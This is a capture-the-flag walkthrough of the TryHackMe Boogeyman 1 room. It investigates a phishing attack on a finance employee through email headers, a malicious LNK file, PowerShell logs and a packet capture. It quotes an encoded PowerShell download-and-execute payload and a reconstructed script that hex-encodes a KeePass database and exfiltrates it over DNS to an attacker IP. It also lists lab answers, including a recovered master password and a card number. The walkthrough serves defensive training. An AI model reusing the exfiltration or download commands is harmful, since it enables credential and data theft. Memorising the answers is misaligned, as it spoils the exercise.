# [TryHackMe - Boogeyman 1](https://tryhackme.com/room/boogeyman1)
![d87e30439112b8241af6c4706df502c4.png](/resources/d87e30439112b8241af6c4706df502c4.png)
***
[toc]
***
## [Email Analysis] Look at that headers!
**The Boogeyman is here!**
Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.
![6cdda00a21868264187052079918f570.png](/resources/6cdda00a21868264187052079918f570.png)
The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

>What is the email address used to send the phishing email?

![09ca60619b113f403940314c7d739a06.png](/resources/09ca60619b113f403940314c7d739a06.png)

After started the machine, we can confirm all of our evidences on the `artefacts` directory located on the desktop right here.

![edf81b27ca87d12174ae28c1902eb733.png](/resources/edf81b27ca87d12174ae28c1902eb733.png)

To make life easier when analyze email header, I copied content from `dump.eml` to [MX Toolbox - Email Header Analyzer](https://mxtoolbox.com/Public/Tools/EmailHeaders.aspx?huid=a8dc53e9-48eb-40ec-ac89-3ab4702f8bb1) to highlight each header in table and automatically validates various information such as SPF, DKIM, DMARC for us which we can see that all "From", "Reply-To" and "Return-Path" are the same which mean its less likely that this sender email was spoofing. 

```
agriffin@bpakcaging.xyz
```

>What is the email address of the victim?

![7120cf7eae25f30161b2a672fbbe47e8.png](/resources/7120cf7eae25f30161b2a672fbbe47e8.png)

We can get the answer from "To" header right here.

```
julianne.westcott@hotmail.com
```

>What is the name of the third-party mail relay service used by the attacker based on the **DKIM-Signature** and **List-Unsubscribe** headers?

![22bb51f73783c5e7b4b5384beee0f294.png](/resources/22bb51f73783c5e7b4b5384beee0f294.png)

Lets start with "DKIM-Signature", we can see the particular domain was listed here.

![14b2ffa7eecefbc572bdc076f323beba.png](/resources/14b2ffa7eecefbc572bdc076f323beba.png)

Which we could also find the same domain from "List-Unsubscribe" as well.

![789207ef7fe3d097a4c220220a9fe0fc.png](/resources/789207ef7fe3d097a4c220220a9fe0fc.png)

By a quick google search, we can see that this domain is belong to Elastic Email which is the third-party mail relay service that we are hunting for.

```
elasticemail
```

>What is the name of the file inside the encrypted attachment?

![9752525f03df03476352b8ff639cc30a.png](/resources/9752525f03df03476352b8ff639cc30a.png)

Lets look at the file attachment, we can see that the file was sent in zip file.

![0c8a46158d33dcfa01a305f945f1afe9.png](/resources/0c8a46158d33dcfa01a305f945f1afe9.png)

And it was encrypted with password so this practice could make email provider and endpoint security could not blocked the file attachment since it was encrypted.

![0b3d631738412b5fda321ac72ffb0a10.png](/resources/0b3d631738412b5fda321ac72ffb0a10.png)

We can copy base64 string to bash shell and decode it which we could use the password found in the email body to extract the content of this file out and then we will have the malicious attachment as the final file attachment and its the answer of this question as well.

```
Invoice_20230103.lnk
```

>What is the password of the encrypted attachment?
```
Invoice2023!
```

>Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

![419dc78841665038c6d39e5b1295ea9a.png](/resources/419dc78841665038c6d39e5b1295ea9a.png)

We can use the following command to extract various infomation stores inside the shortcut file including the Command Line Arguments as well -> `lnkparse Invoice_20230103.lnk` which we can see that upon opened this file on Windows system, it will execute PowerShell base64 command right here. 

![4800211afe05a8193ee54760b71ec320.png](/resources/4800211afe05a8193ee54760b71ec320.png)

We can now decode it to see what it will end up executing and the result shown that it will fetch content from C2 and execute it.

```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

***
## [Endpoint Security] Are you sure that’s an invoice?
Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:
- A PowerShell command was executed.
- Decoding the payload reveals the starting point of endpoint activities.

**Investigation Guide**

With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:
- Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
- Since the given data is JSON, we can parse it in CLI using the `jq` command.
- Note that some logs are redundant and do not contain any critical information; hence can be ignored.

>What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

![e959d9eb927a1723088571dca1da0e06.png](/resources/e959d9eb927a1723088571dca1da0e06.png)

Its time to look into PowerShell log which we can use `cat powershell.json | jq | grep xyz` command to filter event with the domain we found from the attachment which we can see that there are 2 subdomain that was used to host files, the first domain is `files.bpakcaging.xyz` and the other one is `cdn.bpakcaging.xyz` and the latter is the C2 domain that used to send and receive result from the attacker so we can assume that the PowerShell command from `/update` endpoint is resulting with C2 connection.

```
cdn.bpakcaging.xyz,files.bpakcaging.xyz
```

>What is the name of the enumeration tool downloaded by the attacker?

![d5818bad9e8c339924da523a667afbf1.png](/resources/d5818bad9e8c339924da523a667afbf1.png)

We can filter for the line with only "ScriptBlockText" field only with `cat powershell.json | jq | grep "ScriptBlockText" | grep -v "Set-StrictMode"` command which we can see that the attacker also tried to execute PowerShell version of [SeatBeat](https://github.com/GhostPack/Seatbelt) to enumerate various thing on this machine including privilege escalation vectors.

![bea1017a17532034309d807a5d7afdf0.png](/resources/bea1017a17532034309d807a5d7afdf0.png)

And then we could also find that the attacker also got the compiled executable of SeatBelt to execute which we could also see that the previous `sb.exe` that was downloaded might actually be the SeatBelt compiled executable of SeatBelt itself from the command line argument.

```
seatbelt
```

>What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

![091e917b293d2c68d6cd307e3b2b5b0c.png](/resources/091e917b293d2c68d6cd307e3b2b5b0c.png)

We could dig deeper and find the current path of the attacker while running `sql3.exe` on `plum.sqlite` of Microsoft Sticky Notes which stores sticky notes locally on Windows system.

Read more about Windows Sticky Notes Forensics from the following Medium writer here:
- https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef

```
C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
```

>What is the software that uses the file in Q3?

![766fc4d787053053511f98fee7621f27.png](/resources/766fc4d787053053511f98fee7621f27.png)
```
Microsoft Sticky Notes
```

>What is the name of the exfiltrated file?

![9d9577c40c68824df92aacb0e95cc997.png](/resources/9d9577c40c68824df92aacb0e95cc997.png)

Then we can see that the attacker found the keepass database file which he then exfiltrated it to 167.71.211.113.

```
protected_data.kdbx
```

>What type of file uses the .kdbx file extension?
```
keepass
```

>What is the encoding used during the exfiltration attempt of the sensitive file?

I reconstructed PowerShell command to exfiltrate the keepass database file as shown in the following code block.
```PowerShell
$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; 
$destination = \"167.71.211.113\"; 
$bytes=[System.IO.File]::ReadAllBytes($file);
$hex = ($bytes|ForEach-Object ToString X2) -join '';
$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";
```

Which we can see that the fille will be converted to hex, split it to 50 characters each then recursively use `nslookup` to make DNS type A query to the C2 domain we found by adding the hex that were spitted to subdomain.

```
hex
```

>What is the tool used for exfiltration?
```
nslookup
```

***
## [Network Traffic Analysis] They got us. Call the bank immediately!
Based on the PowerShell logs investigation, we have seen the full impact of the attack:
- The threat actor was able to read and exfiltrate two potentially sensitive files.
- The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

**Investigation Guide**

Finally, we can complete the investigation by understanding the network traffic caused by the attack:
- Utilise the domains and ports discovered from the previous task.
- All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
- Follow the streams of the notable commands discovered from PowerShell logs.
- Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

>What software is used by the attacker to host its presumed file/payload server?

![f2264531257fc156c29f4b8152f1afd7.png](/resources/f2264531257fc156c29f4b8152f1afd7.png)

Its time to look at the network capture file, since we already found out that at first the shortcut file will execute PowerShell to fetch content from `/update` and execute it then the additionally seatbeat executable were downloaded from the same domain so we can open HTTP object list by going to "File" -> "Export Objects" -> "HTTP..." and search for "xyz" which we can see that there are 3 object we can export from `files` subdomain and a ton from `cdn` subdomain which is expected since this domain served as C2 for attacker to send command and received the result from infected system. 

![68f5c714cc53fb65957859d2315fec32.png](/resources/68f5c714cc53fb65957859d2315fec32.png)

Since we only want to know about the `files` subdomain so we could follow either 1 of those 3 files which we can see that these files were hosted via Python HTTP Server.

```
python
```

>What HTTP method is used by the C2 for the output of the commands executed by the attacker?

![0aa4f6dbacf415bdb44bcfc1ce465dc8.png](/resources/0aa4f6dbacf415bdb44bcfc1ce465dc8.png)

Its time to inspect the C2, we can see there are 2 different types of "Content Type" from this subdomain and we could see that HTTP POST Method is associated with the http form.

![155c121b2df3ca985ae8d57be5b61fea.png](/resources/155c121b2df3ca985ae8d57be5b61fea.png)

By inspecting the contents of one of the files, we notice a sequence of numbers that resemble ASCII decimal values.

![c6c06b30f0c6c87a5abff723d417d334.png](/resources/c6c06b30f0c6c87a5abff723d417d334.png)

These numbers can be decoded using a tool like CyberChef. Simply use the "From Decimal" operation to convert the decimal values back into readable ASCII characters.

```
POST
```

>What is the protocol used during the exfiltration activity?

![9167664a23948f4438b7b9a31275e05a.png](/resources/9167664a23948f4438b7b9a31275e05a.png)

We know from the previous section that the attacker then exfiltrated keepass database file with DNS query type A so we could confirm it on the Wireshark right here.

![a23d156df9fa845177bf82d9f25cc18a.png](/resources/a23d156df9fa845177bf82d9f25cc18a.png)

Now we can focus on the file exfiltration via DNS query with `ip.dst == 167.71.211.113 && dns.qry.type == 1` filter which will help us extract them on the last question.

```
dns
```

>What is the password of the exfiltrated file?

![2ef308baed848be99aca494eeddc65ee.png](/resources/2ef308baed848be99aca494eeddc65ee.png)

First, we will have to get the query that return with POST request and send the result back to C2 server.

![f56d00186f32e504724557c8521d5778.png](/resources/f56d00186f32e504724557c8521d5778.png)

Next, we can use the following tshark command to get all the data that were sent to C2 server  -> `tshark -r capture.pcapng -Y 'http.content_type == "application/x-www-form-urlencoded"' -T fields -e urlencoded-form.key`

![cc4ab0237de2a99b20ca654dd79f7570.png](/resources/cc4ab0237de2a99b20ca654dd79f7570.png)

Now we can proceed with `tshark -r capture.pcapng -Y 'http.content_type == "application/x-www-form-urlencoded"' -T fields -e urlencoded-form.key  | python3 -c "import sys; print(''.join(chr(int(x)) for x in sys.stdin.read().split()))" | less` command to convert ASCII decimal values to ASCII Characters and pipe the output to `less` since its gonna get overwhelmed and now we can start digging.

![6e6fbdd2f5565f64a8f1d27d8463519b.png](/resources/6e6fbdd2f5565f64a8f1d27d8463519b.png)

Then we will see that the attacker found master password of keepass database which we will use it to access keepass database on the next question!

```
%p9^3!lL^Mz47E2GaT^y
```

>What is the credit card number stored inside the exfiltrated file?

![80cdccb1d0eb6f6d75217afca3ddcdf8.png](/resources/80cdccb1d0eb6f6d75217afca3ddcdf8.png)

Since we already have to filter then we can create tshark command like this -> `tshark -r capture.pcapng -Y "ip.dst == 167.71.211.113 && dns.qry.type == 1" -T fields -e dns.qry.name | uniq | grep -v eu-west-1 | cut -d "." -f 1  | tr -d '\n'` to get ALL hex characters from the subdomain and put it in 1 line.

![71cc227b448e09bf18472fa199fe7332.png](/resources/71cc227b448e09bf18472fa199fe7332.png)

Now we can convert hex to raw bytes by using `tshark -r capture.pcapng -Y "ip.dst == 167.71.211.113 && dns.qry.type == 1" -T fields -e dns.qry.name | uniq | grep -v eu-west-1 | cut -d "." -f 1  | tr -d '\n' | xxd -r -p > protected_data.kdbx` and after checking the result from `file` command then we could confirm that we got the right file.

![d6211133ce23cc9711a71dc182234b07.png](/resources/d6211133ce23cc9711a71dc182234b07.png)

I copied the hex characters to HTB Pwnbox since it let me install tools and access internet which I installed `kpcli` with `sudo apt install kpcli` then we can access keepass database with `kpcli --kdb protected_data.kdbx`.

![c378f6c43032af6a15814c1f82f0a735.png](/resources/c378f6c43032af6a15814c1f82f0a735.png)

After inspecting each entries, we will have the Company Card inside `protected_data/Homebanking` as shown in the image above.

```
4024007128269551
```

![21c0c32c335a8e0952b45a8aeec45b82.png](/resources/21c0c32c335a8e0952b45a8aeec45b82.png)

And now we are done!
***